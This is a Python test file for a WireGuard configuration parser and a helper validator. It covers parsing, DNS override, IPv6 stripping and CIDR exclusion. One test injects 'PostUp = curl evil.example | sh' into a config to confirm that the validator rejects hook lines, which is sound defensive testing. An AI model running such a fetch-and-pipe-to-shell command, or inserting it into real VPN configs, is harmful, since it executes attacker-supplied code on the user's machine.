import importlib.util
import pathlib
from importlib.machinery import SourceFileLoader

import pytest

from cleanroom.vpn.wgconf import WgConfigError, WgQuickConf

GOOD = """[Interface]
# Cleanroom captured config
PrivateKey = kPd7xXJ=example=
Address = 10.2.0.2/32
DNS = 10.2.0.1

[Peer]
PublicKey = sXQ=peer=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 146.70.96.44:51820
PersistentKeepalive = 25
"""


def test_roundtrip():
    conf = WgQuickConf.parse(GOOD)
    assert conf.endpoint == "146.70.96.44:51820"
    assert conf.endpoint_host_port == ("146.70.96.44", 51820)
    assert conf.dns == "10.2.0.1"
    assert conf.tunnel_ip == "10.2.0.2"
    text = conf.serialize()
    reparsed = WgQuickConf.parse(text)
    assert reparsed.endpoint == conf.endpoint
    assert reparsed.addresses == conf.addresses


def test_dns_override():
    conf = WgQuickConf.parse(GOOD)
    conf.with_dns("127.0.0.1")
    assert conf.dns == "127.0.0.1"


def test_missing_fields_rejected():
    with pytest.raises(WgConfigError):
        WgQuickConf.parse("[Interface]\nAddress = 10.2.0.2/32\n")
    with pytest.raises(WgConfigError):
        WgQuickConf.parse(GOOD.replace("Endpoint = 146.70.96.44:51820\n", ""))
    with pytest.raises(WgConfigError):
        WgQuickConf.parse("total garbage")


def _load_helper():
    """Import helper/cleanroom-helper (a standalone script) as a module."""
    path = pathlib.Path(__file__).resolve().parent.parent / "helper" / "cleanroom-helper"
    loader = SourceFileLoader("cleanroom_helper_test", str(path))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


def test_helper_rejects_hook_lines():
    helper = _load_helper()
    assert helper.validate_wg_conf(GOOD) is True
    with_hooks = GOOD.replace(
        "[Peer]", "PostUp = curl evil.example | sh\n\n[Peer]")
    assert helper.validate_wg_conf(with_hooks) is False
    assert helper.validate_wg_conf("random text") is False
    # multiple values on one Address line (comma form) are valid
    assert helper.validate_wg_conf(
        GOOD.replace("Address = 10.2.0.2/32", "Address = 10.2.0.2/32, fd00::2/128")
    ) is True


# ------------------------------------------------- regression tests (review)

def test_without_ipv6_drops_v6_only_address():
    """ipv6=False must not keep an IPv6-only Address/DNS (silent leak)."""
    conf = WgQuickConf.parse(GOOD)
    conf.interface["Address"] = ["fd00::2/128"]
    conf.interface["DNS"] = ["fd00::1"]
    conf.without_ipv6()
    assert "Address" not in conf.interface
    assert "DNS" not in conf.interface
    # the mixed form keeps only the v4 tokens
    conf2 = WgQuickConf.parse(GOOD)
    conf2.interface["Address"] = ["10.2.0.2/32, fd00::2/128"]
    conf2.without_ipv6()
    assert conf2.interface["Address"] == ["10.2.0.2/32"]


def test_without_ipv6_strips_v6_from_allowed_ips():
    conf = WgQuickConf.parse(GOOD)
    conf.without_ipv6()
    assert conf.peer["AllowedIPs"] == ["0.0.0.0/0"]


def test_without_cidrs_full_exclusion_does_not_crash():
    """Excluding 0.0.0.0/0 itself must not raise (address_exclude on an
    equal network raises ValueError — now treated as 'nothing remains')."""
    conf = WgQuickConf.parse(GOOD)                       # 0.0.0.0/0, ::/0
    conf.without_cidrs(["0.0.0.0/0"])
    assert conf.peer["AllowedIPs"] == ["::/0"]           # v4 excluded, v6 kept
    # v4-only AllowedIPs fully excluded → left untouched (cannot route)
    conf3 = WgQuickConf.parse(GOOD)
    conf3.peer["AllowedIPs"] = ["0.0.0.0/0"]
    conf3.without_cidrs(["0.0.0.0/0"])
    assert conf3.peer["AllowedIPs"] == ["0.0.0.0/0"]     # unchanged, no crash
